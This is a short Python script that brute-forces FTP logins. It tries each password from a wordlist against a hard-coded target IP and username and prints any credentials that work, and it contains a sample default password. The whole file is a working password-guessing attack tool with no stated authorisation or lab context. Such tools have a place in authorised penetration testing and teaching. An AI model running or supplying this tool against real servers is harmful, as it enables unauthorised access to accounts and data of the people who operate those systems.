import ftplib

# Test single FTP login attempt
def test_ftp_connection(ip, username, password):
    try:  # Connect and login
        with ftplib.FTP(ip) as ftp:
            ftp.login(user=username, passwd=password)
            print(f"[SUCCESS] Connected and logged in to FTP server at {ip}")
            return True  # Success

    except ftplib.error_perm as e:  # For incorrect login credentials
        print(f"[FAILED] {username}:{password} - {e}")
        return False

    except Exception as e:  # Any other issue
        print(f"[FAILURE] Could not connect to FTP server at {ip}")
        print(f"Reason: {e}")
        return False 
# Brute-force login using a wordlist 
def brute_force_ftp(ip, username, wordlist_path=None):
    if wordlist_path:
        try:
            with open(wordlist_path, 'r') as file:
                passwords = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            # File not found
            print(f"[ERROR] Wordlist file '{wordlist_path}' not found.")
            return

        print(f"[INFO] Starting brute-force with {len(passwords)} passwords...")

        # Try each password in the list
        for password in passwords:
            if test_ftp_connection(ip, username, password):
                # If successful, stop
                print(f"[SUCCESS] Credentials found: {username}:{password}")
                return

        # All passwords tried
        print("[INFO] Brute-force finished. No valid credentials found.")
    else:
        # No wordlist provided, use default password
        print("[INFO] No wordlist provided. Testing single username/password pair.")
        password = "TAIL"
        test_ftp_connection(ip, username, password)

# Example usage
ip_address = "10.190.42.105"
username = "FTPUSER"
password = "TAIL"
wordlist_path = "wordlist.txt"  # provide path to wordlist or set to None


test_ftp_connection(ip_address, username, password)
brute_force_ftp(ip_address, username, wordlist_path)
